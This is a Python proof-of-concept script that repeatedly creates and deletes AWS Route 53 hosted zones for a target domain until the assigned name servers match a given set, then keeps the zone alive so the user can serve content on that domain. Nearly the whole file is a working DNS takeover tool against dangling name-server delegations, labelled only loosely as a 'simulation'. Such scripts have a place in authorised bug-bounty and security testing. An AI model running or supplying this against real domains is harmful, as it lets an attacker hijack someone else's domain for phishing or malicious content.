# Note: Before starting get a key from amazonaws and export them:
## export AWS_ACCESS_KEY_ID="REDACTED"
## export AWS_SECRET_ACCESS_KEY="REDACTED"
## export AWS_DEFAULT_REGION="us-east-1"

# Run below command to install the boto3
# pip instal boto3


import boto3
import time
import uuid

# --- CONFIGURATION ---
TARGET_DOMAIN = "example.com"
# The exact name servers you are trying to match
TARGET_NS = {
    # List of NS records
    "ns-1361.awsdns-42.org.",
    "ns-1855.awsdns-39.co.uk.",
    "ns-873.awsdns-45.net",
    "ns-775.awsdns-32.net."
}
# ---------------------

client = boto3.client('route53')

def attempt_takeover():
    iteration = 0
    print(f"[*] Starting takeover simulation for {TARGET_DOMAIN}...")
    print(f"[*] Target Name Servers: {TARGET_NS}\n")
    
    while True:
        iteration += 1
        caller_ref = str(uuid.uuid4())
        
        try:
            # 1. Create the hosted zone
            response = client.create_hosted_zone(
                Name=TARGET_DOMAIN,
                CallerReference=caller_ref,
                HostedZoneConfig={
                    'Comment': f'PoC Takeover Attempt {iteration}',
                    'PrivateZone': False
                }
            )
            
            zone_id = response['HostedZone']['Id']
            assigned_ns = set(response['DelegationSet']['NameServers'])
            # Ensure trailing dots match the target format
            assigned_ns_with_dots = {ns if ns.endswith('.') else f"{ns}." for ns in assigned_ns}
            
            # 2. Check for intersections
            matches = TARGET_NS.intersection(assigned_ns_with_dots)
            
            if matches:
                print(f"\n[+] SUCCESS on iteration {iteration}!")
                print(f"[+] Hosted Zone ID: {zone_id}")
                print(f"[+] Matched Name Servers: {matches}")
                print("[+] The zone has been kept alive. You can now add records to serve content.")
                break
                
            else:
                print(f"[-] Attempt {iteration}: No match. Assigned: {list(assigned_ns)[:2]}... Deleting zone.")
                # 3. Clean up the unmatched zone immediately to avoid costs and limits
                client.delete_hosted_zone(Id=zone_id)
                
        except client.exceptions.DelegationSetNotAvailable as e:
            print(f"[!] Delegation set conflict. Retrying...")
        except client.exceptions.TooManyHostedZones as e:
            print(f"[!] Hit AWS account hosted zone limits. Clean up your account.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break
            
        # Small delay to reduce heavy rate-limiting/throttling from AWS API
        time.sleep(1)

if __name__ == "__main__":
    attempt_takeover()
